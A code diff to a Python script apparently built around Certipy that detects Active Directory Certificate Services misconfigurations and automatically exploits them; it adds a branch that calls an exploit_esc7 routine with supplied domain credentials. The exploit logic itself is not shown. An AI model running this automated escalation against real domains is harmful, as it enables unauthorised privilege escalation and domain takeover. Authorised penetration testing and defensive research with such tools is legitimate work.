@@ -1,4 +1,4 @@
-from utils.certipy_runner import run_certipy_find, save_results_to_json, exploit_esc1, exploit_esc4
+from utils.certipy_runner import run_certipy_find, save_results_to_json, exploit_esc1, exploit_esc4, exploit_esc7
 from utils.parser import parse_stdout_output
 import argparse
 import os
@@ -46,8 +46,19 @@ def main():
                 template_name=template["template_name"]
             )
             break
+        elif template.get("vuln") == "ESC7":
+            print(f"[+] Detected ESC7 on template: {template['template_name']}")
+            exploit_esc7(
+                username=args.username,
+                password=args.password,
+                domain=args.domain,
+                dc_ip=args.dc_ip,
+                ca_name=template["ca_name"]
+            )
+            break
+
     else:
-        print("[!] No exploitable templates (ESC1 or ESC4) found.")
+        print("[!] No exploitable templates (ESC1 or ESC4 or ESC7) found.")
 
 if __name__ == "__main__":
     main()
